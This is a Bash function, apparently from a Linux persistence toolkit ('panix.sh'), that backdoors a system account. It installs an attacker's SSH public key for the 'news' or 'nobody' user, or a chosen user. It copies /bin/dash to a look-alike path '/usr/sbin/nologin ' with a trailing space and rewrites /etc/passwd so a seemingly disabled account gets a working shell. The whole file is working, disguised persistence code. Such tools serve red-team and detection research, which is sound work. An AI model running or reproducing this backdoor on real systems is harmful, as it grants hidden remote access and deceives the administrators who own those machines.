setup_backdoor_system_user() {
	local key=""
	local user=""
	local path=""
	local default=0
	local custom=0

	usage_backdoor_system_user() {
		echo "Usage: ./panix.sh --backdoor-system-user [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default authorized keys settings"
		echo "  --key <key>                  Specify the public key"
		echo "--custom                     Use custom settings for a specified user"
		echo "  --user <user>                Specify the user"
		echo "  --key <key>                  Specify the public key"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--user )
				shift
				user=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --backdoor-system-user --default --key <public_key>"
				echo "--custom:"
				echo "./panix.sh --backdoor-system-user --custom --user <username> --key <public_key>"
				exit 0
				;;
			--help|-h)
				usage_backdoor_system_user
				exit 0
				;;
			* )
				echo "Invalid option for --backdoor-system-user: $1"
				echo "Try './panix.sh --backdoor-system-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --backdoor-system-user --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $key ]]; then
			echo "Error: --key must be specified with --default."
			echo "Try './panix.sh --backdoor-system-user --help' for more information."
			exit 1
		fi

		# Locate the 'news' user
		local user_entry=$(grep "^news:" /etc/passwd)
		if [[ -z "$user_entry" ]]; then
			# Fallback to 'nobody' user
			user_entry=$(grep "^nobody:" /etc/passwd)
			if [[ -z "$user_entry" ]]; then
				echo "Error: Neither 'news' nor 'nobody' user exists on this system."
				exit 1
			fi
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $user || -z $key ]]; then
			echo "Error: Both --user and --key must be specified with --custom."
			echo "Try './panix.sh --backdoor-system-user --help' for more information."
			exit 1
		fi

		# Locate the specified user
		user_entry=$(grep "^$user:" /etc/passwd)
		if [[ -z "$user_entry" ]]; then
			echo "Error: Specified user '$user' does not exist in /etc/passwd."
			exit 1
		fi

		# Check if the user's shell is /bin/false
		local user_shell=$(echo "$user_entry" | cut -d: -f7)
		if [[ "$user_shell" == "/bin/false" ]]; then
			echo "Error: Specified user '$user' has '/bin/false' as their shell. Please choose another user."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --backdoor-system-user --help' for more information."
		exit 1
	fi

	# Extract the home directory for the user
	local home_dir=$(echo "$user_entry" | cut -d: -f6)
	if [[ -z "$home_dir" ]]; then
		echo "Error: Unable to determine the home directory for the user."
		exit 1
	fi

	# Create the .ssh directory
	mkdir -p "$home_dir/.ssh"
	chmod 755 "$home_dir/.ssh"  # Set directory permissions to be accessible by others

	# Write the public key to authorized_keys
	echo "$key" > "$home_dir/.ssh/authorized_keys"
	chmod 644 "$home_dir/.ssh/authorized_keys"  # Set file permissions to be readable by others

	echo "[+] Authorized_keys persistence established for user: $(echo "$user_entry" | cut -d: -f1)"

	# Check and add "nologin " to /etc/shells if not already present
	if ! grep -q "nologin " /etc/shells; then
		echo "nologin " >> /etc/shells
		echo "[+] Added 'nologin ' to /etc/shells"
	else
		echo "[+] 'nologin ' already exists in /etc/shells. Skipping."
	fi

	# Copy /bin/dash to '/usr/sbin/nologin '
	cp /bin/dash "/usr/sbin/nologin "
	echo "[+] Copied /bin/dash to '/usr/sbin/nologin '"

	# Modify /etc/passwd to include the trailing space in the shell path
	local username=$(echo "$user_entry" | cut -d: -f1)
	sed -i "/^$username:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |" /etc/passwd
	echo "[+] Modified /etc/passwd to update shell path for user: $username"

	echo "[+] System user backdoor persistence established for user: $(echo "$user_entry" | cut -d: -f1)"
}
